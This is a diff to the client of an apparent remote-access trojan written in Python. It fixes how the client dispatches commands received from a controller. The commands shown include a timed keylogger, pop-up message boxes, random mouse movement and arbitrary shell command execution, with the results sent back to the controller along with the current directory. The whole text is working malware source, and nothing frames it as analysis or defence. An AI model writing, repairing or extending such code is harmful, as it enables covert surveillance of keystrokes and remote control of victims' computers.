@@ -77,27 +77,33 @@ while True:
                 if len(command.split()) == 2:
                     kl, time = command.split()
                     time = int(time)
+                    command = ""
                 else:
                     time = 0
                     output = "Usage: kl <time in seconds>"
+                    command = ""
                 with Listener(on_press=log_keystroke) as l:
                     Timer(time, l.stop).start()
                     l.join()
             except ValueError as e:
                 output = "Usage: kl <time in seconds>"
+                command = ""
         if "mb" in command.split():
             try:
                 mb, title, text, style = command.split()
                 message_box(title, text, style)
+                command = ""
             except:
                 output = "Usage: mb <title> <text> <style 0-6>"
+                command = ""
         if "rm" in command.split():
             random_mouse()
             command = ""
         if "close" in command.split():
             client.close()
-        if command.split()[0] not in ["kl", "mb"]:
-            output = subprocess.getoutput(command)
+        else:
+            if command:
+                output = subprocess.getoutput(command)
         cwd = os.getcwd()
         output = str(output)
         send(clientnum + "<?CLIENT?>" + output + "<sep>" + cwd)
